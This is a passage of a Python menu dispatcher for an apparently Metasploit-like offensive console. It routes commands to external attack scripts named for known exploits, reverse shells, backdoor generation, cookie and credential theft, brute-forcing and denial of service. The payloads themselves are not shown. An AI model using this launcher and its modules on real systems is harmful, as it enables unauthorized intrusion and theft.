        print("using linux/vulnerability-find.")
        lexploitvulnerabilityfind()
    elif scconsole == "use site/cve-2022-24521":
        time.sleep(0.5)
        print("using site/cve-2022-24521.")
        tcve202224521()
    elif scconsole == "use site/information-gather":
        time.sleep(0.5)
        print("using site/information-gather.")
        tinformationgather()
    elif scconsole == "use site/port-scan":
        time.sleep(0.5)
        print("using site/port-scan.")
        tportscan()
    elif scconsole == "use dos/ciscodos":
        time.sleep(0.5)
        print("using dos/ciscodos.")
        dciscodos()
    elif scconsole == "use windows/MS04-007_LSASS-exe_Pro_Remote_DoS":
        time.sleep(0.5)
        print("using windows/MS04-007_LSASS-exe_Pro_Remote_DoS.")
        wMS04007LSASSexeProRemoteDoS()
    elif scconsole == "use linux/tcpdump_packet_sniffer":
        time.sleep(0.5)
        print("using linux/tcpdump_packet_sniffer.")
        ltcpdumppacketsniffer()
    elif scconsole == "use php/RCE_via_PHP":
        time.sleep(0.5)
        print("using php/RCE_via_PHP.")
        pRCEviaPHP()
    elif scconsole == "use php/SOPlanning_1-52-01_RCE":
        time.sleep(0.5)
        print("using php/SOPlanning_1-52-01_RCE.")
        pSOPlanning15201RCE()
    elif scconsole == "use multi/Typora_v1-7-4":
        time.sleep(0.5)
        print("using multi/Typora_v1-7-4.")
        mTyporav174()
    elif scconsole == "use php/Wp2Fac":
        time.sleep(0.5)
        print("using php/Wp2Fac.")
        pWp2Fac()
    elif scconsole == "use multi/os_detector":
        time.sleep(0.5)
        print("using multi/os_detector.")
        mosdetector()
    elif scconsole == "use multi/pop3-pass":
        time.sleep(0.5)
        print("using multi/pop3-pass.")
        mpop3pass()
    elif scconsole == "use multi/pop3-brute-force":
        time.sleep(0.5)
        print("using multi/pop3-brute-force.")
        mpop3bruteforce()
    elif scconsole == "use auxiliary/robots_txt":
        time.sleep(0.5)
        print("using auxiliary/robots_txt.")
        aauxiliaryrobotstxt()
    elif scconsole == "use auxiliary/dirs_brute":
        time.sleep(0.5)
        print("using auxiliary/dirs_brute.")
        aauxiliarydirsbrute()
    elif scconsole == "use auxiliary/http-version":
        time.sleep(0.5)
        print("using auxiliary/http-version.")
        aauxiliaryhttpversion()
    elif scconsole == "use auxiliary/enum_apache_user":
        time.sleep(0.5)
        print("using auxiliary/enum_apache_user.")
        aauxiliaryenumapacheuser()
    elif scconsole == "use auxiliary/vuln-scan":
        time.sleep(0.5)
        print("using auxiliary/vuln-scan.")
        aauxiliaryvulnscan()
    elif scconsole == "use auxiliary/smtp-version":
        time.sleep(0.5)
        print("using auxiliary/smtp-version.")
        aauxiliarysmtpversion()
    elif scconsole == "use windows/shell-storm":
        time.sleep(0.5)
        print("using windows/shell-storm.")
        wshellstorm()
    elif scconsole == "use auxiliary/title":
        time.sleep(0.5)
        print("using auxiliary/title.")
        aauxiliarytitle()
    elif scconsole == "use auxiliary/wordpress-scan":
        time.sleep(0.5)
        print("using auxiliary/wordpress-scan.")
        aauxiliarywordpressscan()
    elif scconsole == "use auxiliary/wordpress-vuln":
        time.sleep(0.5)
        print("using auxiliary/wordpress-vuln.")
        aauxiliarywordpressvuln()
    elif scconsole == "use auxiliary/drupal-scan":
        time.sleep(0.5)
        print("using auxiliary/drupal-scan.")
        aauxiliarydrupalscan()
    elif scconsole == "use auxiliary/cookie_stolen":
        time.sleep(0.5)
        print("using auxiliary/cookie_stolen.")
        aauxiliarycookiestolen()
    elif scconsole == "use site/Aurba-501":
        time.sleep(0.5)
        print("using site/Aurba-501.")
        tAurba501()
    elif scconsole == "use site/HughesNet-HT2000W-Satellite-Modem":
        time.sleep(0.5)
        print("using site/HughesNet-HT2000W-Satellite-Modem.")
        tHughesNetHT2000WSatelliteModem()
    elif scconsole == "use auxiliary/basic-auth":
        time.sleep(0.5)
        print("using auxiliary/basic-auth.")
        aauxiliarybasicauth()
    elif scconsole == "use auxiliary/ftp-anonymous":
        time.sleep(0.5)
        print("using auxiliary/ftp-anonymous.")
        aauxiliaryftpanonymous()
    elif scconsole == "use auxiliary/http_put":
        time.sleep(0.5)
        print("using auxiliary/http_put.")
        aauxiliaryhttpput()
    elif scconsole == "use auxiliary/ping-mssql":
        time.sleep(0.5)
        print("using auxiliary/ping-mssql.")
        aauxiliarypingmssql()
    elif scconsole == "use auxiliary/webdav_scanner":
        time.sleep(0.5)
        print("using auxiliary/webdav_scanner.")
        aauxiliarywebdavscanner()
    elif scconsole == "use auxiliary/sitemap-generator":
        time.sleep(0.5)
        print("using auxiliary/sitemap-generator.")
        aauxiliarysitemapgenerator()
    elif scconsole == "use server/cve-2025-0001":
        time.sleep(0.5)
        print("using server/cve-2025-0001.")
        sservercve20250001()
    elif scconsole == "use server/cve-2025-0006":
        time.sleep(0.5)
        print("using server/cve-2025-0006.")
        sservercve20250006()
    elif scconsole == "use windows/reverse_tcp":
        time.sleep(0.5)
        print("using windows/reverse_tcp.")
        wreversetcp()
    elif scconsole == "use exploit/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti":
        time.sleep(0.5)
        print("using exploit/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti.")
        eexploitCVE20250282IvantiexploitCVE20250282Ivanti()
    elif scconsole == "use site/Devika-v1-Path-Traversal":
        time.sleep(0.5)
        print("using site/Devika-v1-Path-Traversal.")
        tDevikav1PathTraversal()
    elif scconsole == "use sniffer/sniffer":
        time.sleep(0.5)
        print("using sniffer/sniffer.")
        sssniffersniffer()
    elif scconsole == "use php/POST-request":
        time.sleep(0.5)
        print("using php/POST-request.")
        pPOSTrequest()
    elif scconsole == "use sniffer/credential-collector":
        time.sleep(0.5)
        print("using sniffer/credential-collector.")
        sssniffercredentialcollector()
    elif scconsole == "use auxiliary/password_cracking/crack-zip":
        time.sleep(0.5)
        print("using auxiliary/password_cracking/crack-zip.")
        aauxiliarypasswordcrackingcrackzip()
    elif scconsole == "use auxiliary/password_cracking/crack-pdf":
        time.sleep(0.5)
        print("using auxiliary/password_cracking/crack-pdf.")
        aauxiliarypasswordcrackingcrackpdf()
    elif scconsole == "use auxiliary/password_cracking/crack-rar":
        time.sleep(0.5)
        print("using auxiliary/password_cracking/crack-rar.")
        aauxiliarypasswordcrackingcrackrar()
    elif scconsole == "use auxiliary/password_cracking/crack-office":
        time.sleep(0.5)
        print("using auxiliary/password_cracking/crack-office.")
        aauxiliarypasswordcrackingcrackoffice()
    elif scconsole == "use sniffer/inspect_traffic":
        time.sleep(0.5)
        print("using sniffer/inspect_traffic.")
        sssnifferinspecttraffic()
    elif scconsole == "use auxiliary/password_cracking/crack-windows-hash":
        time.sleep(0.5)
        print("using auxiliary/password_cracking/crack-windows-hash.")
        aauxiliarypasswordcrackingcrackwindowshash()
    elif scconsole == "use sniffer/SSLstrip":
        time.sleep(0.5)
        print("using sniffer/SSLstrip.")
        sssnifferSSLstrip()
    elif scconsole == "use sniffer/tcpdump-sniffer":
        time.sleep(0.5)
        print("using sniffer/tcpdump-sniffer.")
        sssniffertcpdumpsniffer()
    elif scconsole == "use sniffer/ettercap-sniffer":
        time.sleep(0.5)
        print("using sniffer/ettercap-sniffer.")
        sssnifferettercapsniffer()
    elif scconsole == "use auxiliary/pipe_auditor":
        time.sleep(0.5)
        print("using auxiliary/pipe_auditor.")
        aauxiliarypipeauditor()
    elif scconsole == "use auxiliary/smb_enumshares":
        time.sleep(0.5)
        print("using auxiliary/smb_enumshares.")
        aauxiliarysmbenumshares()
    elif scconsole == "use auxiliary/web-spider":
        time.sleep(0.5)
        print("using auxiliary/web-spider.")
        aauxiliarywebspider()
    elif scconsole == "use auxiliary/apache_mod_status":
        time.sleep(0.5)
        print("using auxiliary/apache_mod_status.")
        aauxiliaryapachemodstatus()
    elif scconsole == "use auxiliary/coldfusion_rce":
        time.sleep(0.5)
        print("using auxiliary/coldfusion_rce.")
        aauxiliarycoldfusionrce()
    elif scconsole == "use auxiliary/http-form-brute":
        time.sleep(0.5)
        print("using auxiliary/http-form-brute.")
        aauxiliaryhttpformbrute()
    elif scconsole == "use multi/nmap-version-detection":
        time.sleep(0.5)
        print("using multi/nmap-version-detection.")
        multinmapversiondetection()
    elif scconsole == "use sniffer/ble-scanner":
        time.sleep(0.5)
        print("using sniffer/ble-scanner.")
        snifferblescanner()
    elif scconsole == "use multi/ble-bypass":
        time.sleep(0.5)
        print("using multi/ble-bypass.")
        multiblebypass()
    elif scconsole == "use multi/ble-scanner":
        time.sleep(0.5)
        print("using multi/ble-scanner.")
        multiblescanner()
    elif scconsole == "use dos/ble-dos":
        time.sleep(0.5)
        print("using dos/ble-dos.")
        dosbledos()
    elif scconsole == "use scanner/portscan-tcp":
        time.sleep(0.5)
        print("using scanner/portscan-tcp.")
        scannerportscantcp()
    elif scconsole == "use scanner/ble-scanner":
        time.sleep(0.5)
        print("using scanner/ble-scanner.")
        scannerblescanner()
    elif scconsole == "use scanner/vnc-none-auth":
        time.sleep(0.5)
        print("using scanner/vnc-none-auth.")
        scannervncnoneauth()
    elif scconsole == "use scanner/ftp-anon":
        time.sleep(0.5)
        print("using scanner/ftp-anon.")
        scannerftpanon()
    elif scconsole == "use scanner/portmap-amp":
        time.sleep(0.5)
        print("using scanner/portmap-amp.")
        scannerportmapamp()
    elif scconsole == "use scanner/subdomain-scan":
        time.sleep(0.5)
        print("using scanner/subdomain-scan.")
        scannersubdomainscan()
    elif scconsole == "use scanner/portscan":
        time.sleep(0.5)
        print("using scanner/portscan.")
        scannerportscan()
    elif scconsole == "use auxiliary/sqli-xss-vuln":
        time.sleep(0.5)
        print("using auxiliary/sqli-xss-vuln.")
        aauxiliarysqlixssvuln()
    elif scconsole == "use scanner/ping_ip_site":
        time.sleep(0.5)
        print("using scanner/ping_ip_site.")
        scannerpingipsite()
    elif scconsole == "use auxiliary/check-login-vuln":
        time.sleep(0.5)
        print("using auxiliary/check-login-vuln.")
        auxiliarycheckloginvuln()
    elif scconsole == "use server/php-cgi-arg-injection":
        time.sleep(0.5)
        print("using server/php-cgi-arg-injection.")
        serverphpcgiarginjection()
    elif scconsole == "use auxiliary/password_cracking/crack_password":
        time.sleep(0.5)
        print("using auxiliary/password_cracking/crack_password.")
        auxiliarypasswordcrackingcrackpassword()
    elif scconsole == "use multi/cve-2025-0282":
        time.sleep(0.5)
        print("using multi/cve-2025-0282.")
        multicve20250282()
    elif scconsole == "use multi/generate_backdoor":
        time.sleep(0.5)
        print("using multi/generate_backdoor.")
        multigeneratebackdoor()
    elif scconsole == "use multi/nc-listener":
        time.sleep(0.5)
        print("using multi/nc-listener.")
        multinclistener()
    elif scconsole == "use windows/ms08_067_netapi":
        time.sleep(0.5)
        print("using windows/ms08_067_netapi.")
        windowsms08067netapi()
    elif scconsole == "use php/WordPress_Core_6-2_Directory_Traversal":
        time.sleep(0.5)
        print("using php/WordPress_Core_6-2_Directory_Traversal.")
        phpWordPressCore62DirectoryTraversal()
    elif scconsole == "use dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS":
        time.sleep(0.5)
        print("using dos/Apache_Commons_FileUpload_and_Apache_Tomcat_DoS.")
        dosApacheCommonsFileUploadandApacheTomcatDoS()
    elif scconsole == "use site/Apache_commons_text_RCE":
        time.sleep(0.5)
        print("using site/Apache_commons_text_RCE.")
        siteApachecommonstextRCE()
    elif scconsole == "use scanner/http-options":
        time.sleep(0.5)
        print("using scanner/http-options.")
        scannerhttpoptions()
    elif scconsole == "use scanner/https-options":
        time.sleep(0.5)
        print("using scanner/https-options.")
        scannerhttpsoptions()
    elif scconsole == "use scanner/server-scanner":
        time.sleep(0.5)
        print("using scanner/server-scanner.")
        scannerserverscanner()
    elif scconsole == "use site/Bludit":
        time.sleep(0.5)
        print("using site/Bludit.")
        siteBludit()
    elif scconsole == "use auxiliary/wordpress-depicter-plugin-3-6-1":
        time.sleep(0.5)
        print("using auxiliary/wordpress-depicter-plugin-3-6-1.")
        auxiliarywordpressdepicterplugin361()
    elif scconsole == "use wordpress_core_6-2_Directory-Traversal":
        time.sleep(0.5)
        print("using wordpress_core_6-2_Directory-Traversal")
        auxiliarywordpresscore62DirectoryTraversal()
    elif scconsole == "use auxiliary/sqli-vuln-test":
        time.sleep(0.5)
        print("using auxiliary/sqli-vuln-test")
        auxiliarysqlivulntest()
    elif scconsole == "use auxiliary/findns":
        time.sleep(0.5)
        print("using auxiliary/findns")
        auxiliaryfindns()
    elif scconsole == "use auxiliary/dnsenum":
        time.sleep(0.5)
        print("using auxiliary/dnsenum")
        auxiliarydnsenum()
    elif scconsole == "use auxiliary/lbdetect":
        time.sleep(0.5)
        print("using auxiliary/lbdetect")
        auxiliarylbdetect()
    elif scconsole == "use auxiliary/base64_decrypt":
        time.sleep(0.5)
        print("using auxiliary/base64_decrypt")
        auxiliarybase64decrypt()
    elif scconsole == "use windows/ShellSend":
        time.sleep(0.5)
        print("using windows/ShellSend")
        windowsShellSend()
    elif scconsole == "use auxiliary/hashdetect":
        time.sleep(0.5)
        print("using auxiliary/hashdetect")
        auxiliaryhashdetect()
    elif scconsole == "use auxiliary/http-bruteforce":
        time.sleep(0.5)
        print("using auxiliary/http-bruteforce")
        auxiliaryhttpbruteforce()
    elif scconsole == "use auxiliary/find-login-fields":
        time.sleep(0.5)
        print("using auxiliary/find-login-fields")
        auxiliaryfindloginfields()
    elif scconsole == "use site/shell_inject":
        time.sleep(0.5)
        print("using site/shell_inject")
        siteshellinject()
    elif scconsole == "use android/android_reverse_tcp":
        time.sleep(0.5)
        print("using android/android_reverse_tcp")
        androidandroidreversetcp()
    elif scconsole == "use auxiliary/xss_scanner":
        time.sleep(0.5)
        print("using auxiliary/xss_scanner")
        auxiliaryxssscanner()
    elif scconsole == "use android/GetShell":
        time.sleep(0.5)
        print("using android/GetShell")
        androidGetShell()
    elif scconsole == "use android/BuildShell":
        time.sleep(0.5)
        print("using android/BuildShell")
        androidBuildShell()
    elif scconsole == "use auxiliary/sql-injection-db-tbl-c":
        time.sleep(0.5)
        print("using auxiliary/sql-injection-db-tbl-c")
        auxiliarysqlinjectiondbtblc()
    elif scconsole == "use auxiliary/xss_tester":
        time.sleep(0.5)
        print("using auxiliary/xss_tester")
        auxiliaryxsstester()
    elif scconsole == "use site/os_finder":
        time.sleep(0.5)
        print("using site/os_finder")
        siteosfinder()
    elif scconsole == "use site/dir_enum":
        time.sleep(0.5)
        print("using site/dir_enum")
        sitedirenum()
    elif scconsole == "use site/sql_injector":
        time.sleep(0.5)
        print("using site/sql_injector")
        sitesqlinjector()
    elif scconsole == "use site/cmd_injector":
        time.sleep(0.5)
        print("using site/cmd_injector")
        sitecmdinjector()
    elif scconsole == "use site/lfi_rfi_scanner":
        time.sleep(0.5)
        print("using site/lfi_rfi_scanner")
        sitelfirfiscanner()
    elif scconsole == "use site/xss_scan":
        time.sleep(0.5)
        print("using site/xss_scan")
        sitexssscan()
    elif scconsole == "use site/upload_finder":
        time.sleep(0.5)
        print("using site/upload_finder")
        siteuploadfinder()
    elif scconsole == "use auxiliary/ftp_brute_force":
        time.sleep(0.5)
        print("using auxiliary/ftp_brute_force")
        auxiliaryftpbruteforce()
    elif scconsole == "use multi/rce_server":
        time.sleep(0.5)
        print("using multi/rce_server")
        multirceserver()
    elif scconsole == "use windows/Exel_Password_Recovery":
        time.sleep(0.5)
        print("using windows/Exel_Password_Recovery")
        windowsExelPasswordRecovery()
    elif scconsole == "use scanner/WAF_Checker":
        time.sleep(0.5)
        print("using scanner/WAF_Checker")
        scannerWAFChecker()
    elif scconsole == "use multi/listener":
        time.sleep(0.5)
        print("using multi/listener")
        multilistener()
    elif scconsole == "use buffer_overflow/fuzzer_basic":
        time.sleep(0.5)
        print("using buffer_overflow/fuzzer_basic")
        bufferoverflowfuzzerbasic()
    elif scconsole == "use buffer_overflow/fuzzer_pattern":
        time.sleep(0.5)
        print("using buffer_overflow/fuzzer_pattern")
        bufferoverflowfuzzerpattern()
    elif scconsole == "use buffer_overflow/find_offsec":
        time.sleep(0.5)
        print("using buffer_overflow/find_offsec")
        bufferoverflowfindoffsec()
    elif scconsole == "use buffer_overflow/buffer_overflow_exploit_builder":
        time.sleep(0.5)
        print("using buffer_overflow/buffer_overflow_exploit_builder")
        bufferoverflowbufferoverflowexploitbuilder()
    elif scconsole == "use scanner/csrf_token_detect":
        time.sleep(0.5)
        print("using scanner/csrf_token_detect")
        scannercsrftokendetect()
    elif scconsole == "use auxiliary/https_brute_force":
        time.sleep(0.5)
        print("using auxiliary/https_brute_force")
        auxiliaryhttpsbruteforce()
    elif scconsole == "use windows/windows_webdav_url_rce_cve_2025_33053":
        time.sleep(0.5)
        print("using windows/windows_webdav_url_rce_cve_2025_33053")
        windowswindowswebdavurlrcecve202533053()
    elif scconsole == "use site/cve_2021_41773_apache_rce":
        time.sleep(0.5)
        print("using site/cve_2021_41773_apache_rce")
        sitecve202141773apacherce()
    elif scconsole == "use site/cve_2021_42013_apache_bypass_rce":
        time.sleep(0.5)
        print("using site/cve_2021_42013_apache_bypass_rce")
        sitecve202142013apachebypassrce()
    elif scconsole == "use auxiliary/mikrotik-routeros-7-19-1-xss":
        time.sleep(0.5)
        print("using auxiliary/mikrotik-routeros-7-19-1-xss")
        auxiliarymikrotikrouteros7191xss()
    elif scconsole == "use site/file_list_wordpress_pligun_4-2-2":
        time.sleep(0.5)
        print("using site/file_list_wordpress_pligun_4-2-2")
        sitefilelistwordpresspligun422()
    elif scconsole == "use windows/smbghost":
        time.sleep(0.5)
        print("using windows/smbghost")
        windowssmbghost()
    elif scconsole == "use system commands":
            OSconsole()
            OSconsole()
            OSconsole()
            OSconsole()
    elif scconsole == "use system command":
            OSconsole()
            OSconsole()
            OSconsole()
            OSconsole()
    elif scconsole == "exit":
        exit()
    else:
        time.sleep(0.5)
        print("there is no command or option to use like that!")

def exploitms17010psexec():
    scconsole6 = input("sc~" + color.red + "(exploit/ms17-010-psexec)" + color.white + ">")
    if scconsole6 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitms17010psexec()
    elif scconsole6 == "clear":
        os.system('clear')
        exploittomcatmgrlogin()
    elif scconsole6 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
USERNAMELIST     | specify the username list.
PASSLIST         | specify the password list.
CMD              | specify the cmd command.

you will specifiy these options when you run or exploit it!
""")
        exploitms17010psexec()
    elif scconsole6 == "run":
        os.system('python exploits/ms17-010-psexec.py')
        exploitms17010psexec()
    elif scconsole6 == "exploit":
        os.system('python exploits/ms17-010-psexec.py')
        exploitms17010psexec()
    elif scconsole6 == "unuse":
        print("unusing exploit/ms17-010-psexec.")
        time.sleep(0.5)
        Console()
    elif scconsole6 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def exploitbypassuaceventvwr():
    scconsole7 = input("sc~" + color.red + "(exploit/bypassuac-eventvwr)" + color.white + ">")
    if scconsole7 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitbypassuaceventvwr()
    elif scconsole7 == "clear":
        os.system('clear')
        exploitbypassuaceventvwr()
    elif scconsole7 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
CMD              | specify the cmd command.

you will specifiy these options when you run or exploit it!
""")
        exploitbypassuaceventvwr()
    elif scconsole7 == "run":
        os.system('python exploits/bypassuac-eventvwr.py')
        exploitbypassuaceventvwr()
    elif scconsole7 == "exploit":
        os.system('python exploits/bypassuac-eventvwr.py')
        exploitbypassuaceventvwr()
    elif scconsole7 == "unuse":
        print("unusing exploit/bypassuac-eventvwr.")
        time.sleep(0.5)
        Console()
    elif scconsole7 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def exploitfindvulnerabilitesscan():
    scconsole8 = input("sc~" + color.red + "(exploit/find-vulnerabilites-scan)" + color.white + ">")
    if scconsole8 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "clear":
        os.system('clear')
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.

you will specifiy these options when you run or exploit it!
""")
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "run":
        os.system('python exploits/find-vulnerabilites-scan.py')
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "exploit":
        os.system('python exploits/find-vulnerabilites-scan.py')
        exploitfindvulnerabilitesscan()
    elif scconsole8 == "unuse":
        print("unusing exploit/find-vulnerabilites-scan.")
        time.sleep(0.5)
        Console()
    elif scconsole8 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def exploitsshversion():
    scconsole12 = input("sc~" + color.red + "(exploit/ssh-version)" + color.white + ">")
    if scconsole12 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitsshversion()
    elif scconsole12 == "clear":
        os.system('clear')
        exploitsshversion()
    elif scconsole12 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address or url.
RPORT         | specified as 22. (ssh port).

you will specifiy these options when you run or exploit it!
""")
        exploitsshversion()
    elif scconsole12 == "run":
        os.system('python exploits/ssh-version.py')
        exploitsshversion()
    elif scconsole12 == "exploit":
        os.system('python exploits/ssh-version.py')
        exploitsshversion()
    elif scconsole12 == "unuse":
        print("unusing exploit/ssh-version.")
        time.sleep(0.5)
        Console()
    elif scconsole12 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def exploitreverseshell():
    scconsole16 = input("sc~" + color.red + "(exploit/reverse-shell)" + color.white + ">")
    if scconsole16 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        exploitreverseshell()
    elif scconsole16 == "clear":
        os.system('clear')
        exploitreverseshell()
    elif scconsole16 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
LHOST            | specify your ip address.
LPORT            | specify your port.

you will specifiy these options when you run or exploit it!
""")
        exploitreverseshell()
    elif scconsole16 == "run":
        os.system('php exploits/reverse-shell.php')
        exploitreverseshell()
    elif scconsole16 == "exploit":
        os.system('php exploits/reverse-shell.php')
        exploitreverseshell()
    elif scconsole16 == "unuse":
        print("unusing exploit/reverse-shell.")
        time.sleep(0.5)
        Console()
    elif scconsole16 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def wexploitsshlogintest():
    scconsole19 = input("sc~" + color.red + "(windows/ssh-login-test)" + color.white + ">")
    if scconsole19 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitsshlogintest()
    elif scconsole19 == "clear":
        os.system('clear')
        wexploitsshlogintest()
    elif scconsole19 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address or url.
LPORT         | specified as 22. (ssh port).
PASSLIST      | specify the password list path.
USERNAMELIST  | specify the username list path.

you will specifiy these options when you run or exploit it!
""")
        wexploitsshlogintest()
    elif scconsole19 == "run":
        os.system('python exploits/windows/ssh-login-test.py')
        wexploitsshlogintest()
    elif scconsole19 == "exploit":
        os.system('python exploits/windows/ssh-login-test.py')
        wexploitsshlogintest()
    elif scconsole19 == "unuse":
        print("unusing windows/ssh-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole19 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def wexploitjavarhino():
    scconsole20 = input("sc~" + color.red + "(windows/java-rhino)" + color.white + ">")
    if scconsole20 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitjavarhino()
    elif scconsole20 == "clear":
        os.system('clear')
        wexploitjavarhino()
    elif scconsole20 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address.
RPORT         | specify the target port (port 445 needs to open on target).
CMD           | specify the cmd command.

you will specifiy these options when you run or exploit it!
""")
        wexploitjavarhino()
    elif scconsole20 == "run":
        os.system('python exploits/windows/java-rhino.py')
        wexploitjavarhino()
    elif scconsole20 == "exploit":
        os.system('python exploits/windows/java-rhino.py')
        wexploitjavarhino()
    elif scconsole20 == "unuse":
        print("unusing windows/java-rhino.")
        time.sleep(0.5)
        Console()
    elif scconsole20 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def wexploitms17010psexec():
    scconsole21 = input("sc~" + color.red + "(windows/ms17_010)" + color.white + ">")
    if scconsole21 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitms17010psexec()
    elif scconsole21 == "clear":
        os.system('clear')
        wexploitms17010psexec()
    elif scconsole21 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.

you will specifiy these options when you run or exploit it!
""")
        wexploitms17010psexec()
    elif scconsole21 == "run":
        os.system('python exploits/windows/ms17_010.py')
        wexploitms17010psexec()
    elif scconsole21 == "exploit":
        os.system('python exploits/windows/ms17_010.py')
        wexploitms17010psexec()
    elif scconsole21 == "unuse":
        print("unusing windows/ms17_010.")
        time.sleep(0.5)
        Console()
    elif scconsole21 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def wexploitPDFexploit():
    scconsole22 = input("sc~" + color.red + "(windows/PDF-exploit)" + color.white + ">")
    if scconsole22 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitPDFexploit()
    elif scconsole22 == "clear":
        os.system('clear')
        wexploitPDFexploit()
    elif scconsole22 == "show options":
        print("""
NO OPTION OR DISCREPTIONS HERE!
""")
        wexploitPDFexploit()
    elif scconsole22 == "run":
        os.system('python exploits/windows/PDF-exploit.py')
        wexploitPDFexploit()
    elif scconsole22 == "exploit":
        os.system('python exploits/windows/PDF-exploit.py')
        wexploitPDFexploit()
    elif scconsole22 == "unuse":
        print("unusing windows/PDF-exploit.")
        time.sleep(0.5)
        Console()
    elif scconsole22 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def wexploitftplogintest():
    scconsole23 = input("sc~" + color.red + "(windows/ftp-login-test)" + color.white + ">")
    if scconsole23 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wexploitftplogintest()
    elif scconsole23 == "clear":
        os.system('clear')
        wexploitftplogintest()
    elif scconsole23 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
RHOST            | specify the target ip address.
USERNAMELIST     | specify the username list.
PASSLIST         | specify the password list.

you will specifiy these options when you run or exploit it!
""")
        wexploitftplogintest()
    elif scconsole23 == "run":
        os.system('python exploits/windows/ftp-login-test.py')
        wexploitftplogintest()
    elif scconsole23 == "exploit":
        os.system('python exploits/windows/ftp-login-test.py')
        wexploitftplogintest()
    elif scconsole23 == "unuse":
        print("unusing windows/ftp-login-test.")
        time.sleep(0.5)
        Console()
    elif scconsole23 == "exit":
        exit()
    else:
        print("There is no command or option like that!\nunusing ...")
        time.sleep(0.5)
        Console()

def texploitXSS():
    scconsole24 = input("sc~" + color.red + "(site/XSS-SQLi-PHP-PASS)" + color.white + ">")
    if scconsole24 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        texploitXSS()
    elif scconsole24 == "clear":
        os.system('clear')
        texploitXSS()
    elif scconsole24 == "show options":
        print("""
OPTIONS          | DISCREPTIONS
-----------------|----------------------
URL              | specify the target url login-page.
USERNAME         | specify the username.

you will specifiy these options when you run or exploit it!
""")
        texploitXSS()
    elif scconsole24 == "run":
        os.system('python exploits/site/XSS-SQLi-PHP-PASS.py')
        texploitXSS()
    elif scconsole24 == "exploit":
        os.system('python exploits/site/XSS-SQLi-PHP-PASS.py')
        texploitXSS()
    elif scconsole24 == "unuse":
        print("unusing site/XSS-SQLi-PHP-PASS.")
